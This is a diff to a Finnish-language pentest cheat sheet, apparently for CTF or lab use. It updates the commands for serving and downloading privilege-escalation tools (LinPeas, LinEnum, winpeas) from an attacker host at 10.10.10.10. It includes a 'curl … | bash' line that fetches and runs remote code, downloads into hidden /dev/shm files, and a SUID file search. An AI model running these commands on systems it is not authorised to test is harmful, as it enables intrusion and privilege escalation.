@@ -846,10 +846,11 @@ LinPeas								<--->	PrivEsc scanneri
 LinEnum								<--->	PrivEsc scanneri
 pspy64s								<--->	CRON job scanneri
 
-python -m SimpleHTTPServer 9911                                 <--->   Lataus serveri
+python3 -m http.server 9911                                <--->   Lataus serveri portti 9911
 curl 10.10.10.10/LinEnum/LinEnum.sh | bash			<--->	Python http palvelimelta suoraan portti 80
 wget 10.10.10.10:9911/linenum.sh -O /dev/shm/.linenum.sh	<--->	wget linenum simplepython palvelimesta
 wget 10.10.10.10:9911/winpeas.exe -O ./winpeas.exe		<--->	wget winpeas nykyiseen kansioon
+wget 10.10.10.10:9911/linpeas.sh -O /dev/shm/.linpeas.sh	<--->	wget linenum simplepython palvelimesta
 
 SUID
 find / -perm /4000 2>/dev/null					<--->	Etsii set uid tiedostoja kaikki ohjelmat 
